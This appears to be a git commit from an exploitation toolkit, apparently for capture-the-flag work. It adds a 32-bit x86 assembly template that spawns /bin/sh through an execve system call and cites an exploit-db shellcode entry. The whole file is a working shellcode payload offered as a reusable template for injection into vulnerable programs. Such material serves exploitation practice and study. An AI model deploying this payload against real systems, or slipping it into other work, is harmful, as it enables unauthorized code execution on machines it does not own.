e9cb4e14009a9ea3cbd08c2c4992d0e24b69e097
Malfurious <m@lfurio.us>
2021-08-22 05:52:56 -0400

    Add generic /bin/sh shellcode templates
    Signed-off-by: Malfurious <m@lfurio.us>

---
+++ templates/shellcode/shell32.asm
@@ -0,0 +1,14 @@
+[SECTION .text]
+global _start
+
+; https://www.exploit-db.com/shellcodes/46809
+
+_start:
+    xor     ecx, ecx
+    push    0xb
+    pop     eax
+    push    ecx
+    push    0x68732f2f
+    push    0x6e69622f
+    mov     ebx, esp
+    int     0x80
